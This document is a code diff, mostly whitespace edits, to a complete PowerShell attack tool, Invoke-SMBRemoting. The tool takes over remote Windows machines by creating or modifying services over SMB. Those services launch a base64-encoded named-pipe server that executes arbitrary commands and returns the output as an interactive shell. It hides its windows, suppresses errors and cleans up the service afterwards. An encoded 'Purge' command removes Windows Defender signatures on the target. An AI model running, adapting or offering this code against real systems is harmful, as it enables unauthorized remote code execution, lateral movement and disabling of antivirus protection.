@@ -1,5 +1,5 @@
 function Invoke-SMBRemoting {
-	
+
 	<#
 
 	.SYNOPSIS
@@ -11,28 +11,28 @@ function Invoke-SMBRemoting {
 
  	.REQUIREMENTS
 	Admin rights over the target Host
-	
+
 	.PARAMETER ComputerName
 	The Server HostName or IP to connect to
-	
+
 	.PARAMETER PipeName
 	Specify the Pipe Name
-	
+
 	.PARAMETER ServiceName
 	Specify the Service Name
-	
+
 	.PARAMETER Command
 	Specify a command to run instead of getting a Shell
-	
+
 	.PARAMETER Timeout
 	Specify a Timeout after which the script will stop waiting for a connection
-	
+
 	.PARAMETER ModifyService
 	Modify an existing service instead of creating a new one. If no target service is specified SensorService is targeted
-	
+
 	.PARAMETER Verbose
 	Show Pipe and Service Name info
-	
+
 	.EXAMPLE
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
@@ -40,7 +40,7 @@ function Invoke-SMBRemoting {
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Command "whoami /all"
-	
+
 	#>
 
 	param (
@@ -53,28 +53,28 @@ function Invoke-SMBRemoting {
 		[switch]$Purge,
 		[switch]$Verbose
 	)
-	
+
 	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
 	Set-Variable MaximumHistoryCount 32767
-	
+
 	if (-not $ComputerName) {
 		Write-Output " [-] Please specify a Target"
 		return
 	}
-	
+
 	if(!$PipeName){
 		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
 		$randomvalue = $randomvalue -join ""
 		$PipeName = $randomvalue
 	}
-	
+
 	if(!$ServiceName -AND !$ModifyService){
 		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
 		$randomvalue = $randomvalue -join ""
 		$ServiceName = "Service_" + $randomvalue
 	}
-	
+
 	elseif(!$ServiceName -AND $ModifyService){
 		$ServiceName = "SensorService"
 	}
@@ -92,49 +92,49 @@ function Invoke-SMBRemoting {
 		}
 		break
 	}
-	
+
 	if($Purge){
-		
+
 		if($Verbose){
 			Write-Output "[+] Service Name: $ServiceName"
 			Write-Output "[+] Creating Service on Remote Target..."
 		}
-		
+
 		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==`""
-	
+
 		$startarguments = "\\$ComputerName start $ServiceName"
-		
+
 		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-		
+
 		Start-Sleep -Milliseconds 1000
-		
+
 		if($Verbose){
 			Write-Output "[+] Service created"
 		}
-		
+
 		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
-		
+
 		Start-Sleep -Milliseconds 3000
-		
+
 		if($Verbose){
 			Write-Output "[+] Service started"
 		}
-		
+
 		$stoparguments = "\\$ComputerName delete $ServiceName"
-		
+
 		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
-		
+
 		if($Verbose){
 			Write-Output "[+] Service deleted"
 		}
-		
+
 		Write-Output "[+] Done!"
-		
+
 		Write-Output ""
-		
+
 		break
 	}
-	
+
 	$ServerScript = @"
 `$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
 `$tcb={param(`$state);`$state.Close()};
@@ -149,7 +149,7 @@ while (`$true) {
 		break
 	}
 	`$command = `$sr.ReadLine()
-	if (`$command -eq "exit") {break} 
+	if (`$command -eq "exit") {break}
 	else {
 		try{
 			`$result = Invoke-Expression `$command | Out-String
@@ -165,41 +165,41 @@ while (`$true) {
 `$pipeServer.Disconnect()
 `$pipeServer.Dispose()
 "@
-	
+
 	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
-	
+
 	if($ModifyService){
-		
+
 		$originalBinPath = & sc.exe \\$ComputerName qc $ServiceName | Select-String "BINARY_PATH_NAME" | ForEach-Object {$_.ToString().Split(":", 2)[1].Trim()}
-		
+
 		$arguments = "\\$ComputerName config $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
-		
+
 		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-		
+
 		# Optional: Restart the service to apply the changes
 		$stopArguments = "\\$ComputerName stop $ServiceName"
 		$startArguments = "\\$ComputerName start $ServiceName"
-		
+
 		# Stop the service
 		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
-		
+
 		Start-Sleep -Milliseconds 1000
-		
+
 		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
 	}
-	
+
 	else{
 		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
-	
+
 		$startarguments = "\\$ComputerName start $ServiceName"
-		
+
 		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-		
+
 		Start-Sleep -Milliseconds 1000
-		
+
 		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
 	}
-	
+
 	if($Verbose){
 		if($ModifyService){
 			Write-Output "[+] Pipe Name: $PipeName"
@@ -215,10 +215,10 @@ while (`$true) {
 			Write-Output ""
 		}
 	}
-	
+
 	# Get the current process ID
 	$currentPID = $PID
-	
+
 	if($ModifyService){
 	# Embedded monitoring script
 	$monitoringScript = @"
@@ -264,14 +264,14 @@ while (`$true) {
 	}
 }
 "@}
-	
+
 	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
-	
+
 	# Execute the embedded monitoring script in a hidden window
 	$MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru
-	
+
 	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
-	
+
  	try {
 		$pipeClient.Connect($Timeout)
 	} catch [System.TimeoutException] {
@@ -288,7 +288,7 @@ while (`$true) {
 	$sw = New-Object System.IO.StreamWriter($pipeClient)
 
 	$serverOutput = ""
-	
+
 	if ($Command) {
 		$Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
 		$Command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | IEX"
@@ -305,15 +305,15 @@ while (`$true) {
 				$serverOutput += "$line`n"
 			}
 		}
-	} 
-	
+	}
+
 	else {
 		while ($true) {
-			
+
 			# Fetch the actual remote prompt
 			$sw.WriteLine("prompt | Out-String")
 			$sw.Flush()
-			
+
 			$remotePath = ""
 			while ($true) {
 				$line = $sr.ReadLine()
@@ -332,20 +332,20 @@ while (`$true) {
 			$promptString = "[$computerNameOnly]: $remotePath "
 			Write-Host -NoNewline $promptString
 			$userCommand = Read-Host
-			
+
 			if ($userCommand -eq "exit") {
 				Write-Output ""
 					$sw.WriteLine("exit")
 				$sw.Flush()
 				break
 			}
-			
+
 			elseif($userCommand -ne ""){
 				$fullCommand = "$userCommand 2>&1 | Out-String"
 				$sw.WriteLine($fullCommand)
 				$sw.Flush()
 			}
-			
+
 			else{
 				continue
 			}
@@ -364,19 +364,19 @@ while (`$true) {
 			}
 		}
 	}
-	
+
 	if($ModifyService){
 		$stopArguments = "\\$ComputerName stop $ServiceName"
 		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
 		$arguments = "\\$ComputerName config $ServiceName binpath= $originalBinPath"
 		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-		
+
 	}
 	else{
 		$stoparguments = "\\$ComputerName delete $ServiceName"
 		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
 	}
-	
+
 	$pipeClient.Close()
 	$pipeClient.Dispose()
 	Stop-Process -Id $MonitoringProcess.Id
